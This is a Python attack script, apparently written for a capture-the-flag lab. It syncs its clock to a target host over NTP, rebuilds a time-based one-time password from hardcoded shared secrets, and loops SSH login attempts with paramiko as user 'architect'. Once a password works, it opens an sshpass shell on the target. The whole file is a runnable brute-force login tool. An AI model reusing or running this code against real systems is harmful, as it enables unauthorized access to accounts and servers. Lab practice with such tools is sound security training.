import time, subprocess, random, sys, os
import paramiko 
import ntplib
# import traceback as tb
from time import ctime
from hashlib import sha256
from datetime import datetime, timedelta

#shared secret token for OTP calculation
sharedSecret1 = 128939448577488
sharedSecret2 = 592988748673453
sharedSecret3 = 792513759492579
USER = "architect"
RHOST = "10.10.59.109" # LinuxBayServerIPv4Address_HERE!!! CHANGE UPON AttackBox ReInstantiated...!!!

"""
M4tr1xBrute.py: 
Methods: ntplib.NTPClient, 

TimeSet: (Input Args) country:str, hours: int,str, mins: int,str, seconds: str,int -> int
getRandom: (Input Args): N/A -> str

Description: Derived from GeardoRanger GitHub M4tr1xBrute.py(https://github.com/GeardoRanger/M4tr1xBrute).
Attempting to establish NTPClient Declarations, and verifying successful ssh hacking NTPClient Request via Paramiko 
and run commands for attempted ssh login according to ssh totp diagrams taken from hacking into BlackCat User for the Architect Login...

"""

try:
    subprocess.call("sudo timedatectl set-timezone UTC", shell=True)
    print("Subprocess TimeZone Change Successful.")
    client = ntplib.NTPClient() #NTPClient Establishment Attempt
    response = client.request(RHOST) #IP of linux-bay server login request on RHOST for response packet Layer 6+ from Transport Layer
    print("ntplib.NTPClient().request({}): response = {}\n".format(RHOST, response)) #Debug Statement: Informational
    os.system("date {}".format(time.strftime('%m%d%H%M%Y.%S', time.localtime(response.tx_time))))
except:
    print('Could not sync with time server.')
    sys.exit()

print('\nTime Sync Completed Successfully.\nConducting brute-force on OTP\n')

secretList = [sharedSecret1, sharedSecret2, sharedSecret3]

def TimeSet(country, hours, mins, seconds):
    now = datetime.now() + timedelta(hours=hours, minutes=mins)
    CurrentTime = int(now.strftime("%d%H%M"))
    print("M4tr1xBrute: TimeSet: CurrentTime = {}\n".format(CurrentTime) )
    return(CurrentTime)

def getRandom():
    ca = TimeSet('Ukraine', 4, 43, 1)
    cb = TimeSet('Germany', 13, 55, 0)
    cc = TimeSet('England', 9, 19, 1)
    cd = TimeSet('Nigeria', 1, 6, 1)
    ce = TimeSet('Denmark', -5, 18, 1)
    
    timeSetList = [ca, cb, cc, cd, ce]
    randomTimeSet = random.sample(timeSetList, 3)
    
    ctt = randomTimeSet[0] * randomTimeSet[1] * randomTimeSet[2]
    uc = ctt ^ random.choice(secretList)
    hc = (sha256(repr(uc).encode('utf-8')).hexdigest())
    t = hc[22:44]
    print("M4tr1xBrute: getRandom: t = {}\n".format(t))
    return t

while True:
    OTP = getRandom()
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(RHOST, username=USER, password=OTP)
        print("Success with: {}\n".format(OTP))
        # OTP = bytes(str(OTP), encoding='utf-8')
        # RHOST = bytes(str(RHOST), encoding='utf-8')
        # output = subprocess.getoutput(f'gnome-terminal -x bash -c "sshpass -p {OTP} ssh {USER}@{RHOST}"')
        # exec(output)
        print("Execute this command: sshpass -p \'{}\' ssh architect@{}\n\n You have 60 seconds or less to run this command.".format(OTP,RHOST))
        sshprocess = subprocess.Popen(["sshpass", "-p", "{}".format(OTP), "ssh", "architect@{}".format(RHOST)])
        processExitCode = sshprocess.poll()
        print("processExitCode = {}\n".format(processExitCode))
        sys.exit()
    except Exception as ex:
        print("Connection failed with: {}, trying again!\n".format(OTP))
        # tb.print_exc()
        continue